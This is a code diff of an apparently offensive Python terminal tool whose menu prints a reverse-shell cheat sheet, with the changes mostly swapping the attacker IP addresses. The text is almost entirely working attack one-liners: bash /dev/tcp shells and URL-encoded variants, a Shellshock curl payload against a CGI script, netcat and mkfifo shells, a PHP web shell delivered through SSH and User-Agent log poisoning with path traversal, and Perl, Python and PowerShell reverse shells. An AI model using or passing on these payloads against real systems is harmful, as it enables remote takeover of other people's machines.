@@ -102,7 +102,8 @@ while True:
         charizar ('(づ ￣ ³￣)づ SCANNING COMPLETED')
         charizar ('=================================')
         print ("")
-
+    
+    #Bonus function
     if action == "2":
         os.system('clear')
         print ("")
@@ -125,7 +126,7 @@ while True:
         charizar ('♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
         charizar ('     (っ◔◡◔)っ ♥Always Hack')
         charizar ('♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
-
+    #Reverse-shell function | Menu | Function loop for listing reverse-shell |
     if action == "3":
         os.system('clear')
         while True:
@@ -159,8 +160,8 @@ while True:
                 charizar('              (っ◔◡◔)っREVERSE|BASH')
                 charizar('              ------------------------------------------------------------------------')
                 bulbasur('''\n
-                |$ bash -i >& /dev/tcp/192.168.1.69/443 0>&1 \n
-                |$ bash -c "bash -i >& /dev/tcp/192.168.1.69/443 0>&1" \n
+                |$ bash -i >& /dev/tcp/192.168.1.2/443 0>&1 \n
+                |$ bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1" \n
                 |$ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
                 ''')
                 charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')
@@ -173,8 +174,8 @@ while True:
                 charizar('              (っ◔◡◔)っREVERSE|SHELLSHOCK')
                 charizar('              ------------------------------------------------------------------------')
                 bulbasur('''\n
-                |$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.69/443 0>&1'"\n
-                 "http://192.168.1.20/cgi-bin/user.sh"
+                |$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'"\n
+                 "http://192.168.1.3/cgi-bin/user.sh"
                 ''')
                 charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')
 
@@ -186,12 +187,12 @@ while True:
                 charizar('              (っ◔◡◔)っREVERSE|NETCAT')
                 charizar('              ------------------------------------------------------------------------')
                 bulbasur('''\n
-                |$ ncat 192.168.1.69 443 -e /bin/bash\n
-                |$ nc -e /bin/sh 696.969.6.9 443 \n
-                |$ nc -e /bin/bash 696.969.6.9 443 \n
-                |$ nc -c bash 696.969.6.9 443 \n
-                |$ nc.exe -e cmd 192.168.1.69 443 \n
-                |$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.69 443 >/tmp/f \n
+                |$ ncat 192.168.1.2 443 -e /bin/bash\n
+                |$ nc -e /bin/sh 192.168.1.2 443 \n
+                |$ nc -e /bin/bash 192.168.1.2 443 \n
+                |$ nc -c bash 192.168.1.2 443 \n
+                |$ nc.exe -e cmd 192.168.1.2 443 \n
+                |$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f \n
                 |$ rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%\n
                 02%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
                 ''')
@@ -207,10 +208,10 @@ while True:
                 bulbasur('''\n
                 |$ <?php system($_GET['cmd']);?> \n
                 !0!(SSH Log Poisoning) -> /var/log/auth.log \n
-                |$ ssh '<?php system($_GET['cmd']); ?>'@696.969.6.9 \n
+                |$ ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2 \n
                 !0!(HTTP User-Agent Log Poisoning) -> /var/log/apache2/access.log \n
                 |$ curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>"\n
-                 "http://696.969.6.9/browse.php?file=../../../../../var/log/apache2/access.log"\n
+                 "http://192.168.1.2/browse.php?file=../../../../../var/log/apache2/access.log"\n
                 ''')
                 charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')
 
@@ -222,7 +223,7 @@ while True:
                 charizar('              (っ◔◡◔)っREVERSE|PERL')
                 charizar('              ------------------------------------------------------------------------')
                 bulbasur('''\n
-                |$ perl -e 'use Socket;$i="696.969.6.9";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname\n
+                |$ perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname\n
                 ("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");\n
                 open(STDERR,">&S");exec("/bin/sh -i");};'
                 ''')
@@ -236,14 +237,14 @@ while True:
                 charizar('              (っ◔◡◔)っREVERSE|PYTHON')
                 charizar('              ------------------------------------------------------------------------')
                 bulbasur('''\n
-                |$  export RHOST="696.969.6.9";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket()\n
+                |$  export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket()\n
                 ;s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\n
                 ;pty.spawn("/bin/sh")' \n
                 |$  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n
-                ;s.connect(("696.969.6.9",443));os.dup2(s.fileno(),0)\n
+                ;s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0)\n
                 ; os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' \n
                 |$  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n
-                ;s.connect(("696.969.6.9",443));os.dup2(s.fileno(),0)\n
+                ;s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0)\n
                 ; os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
                 ''')
                 charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')
@@ -269,13 +270,13 @@ while True:
                 charizar('              (っ◔◡◔)っREVERSE|POWERSHELL')
                 charizar('              ------------------------------------------------------------------------')
                 bulbasur('''\n
-                |$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.69",443);\n$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);\n
+                |$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",443);\n$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);\n
                 $stream.Flush()};$client.Close()\n
                 ''')
                 charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')
 
                 print ("")
-
+    #Exit Function 
     if action == "4":
         print ("")
         os.system('clear')
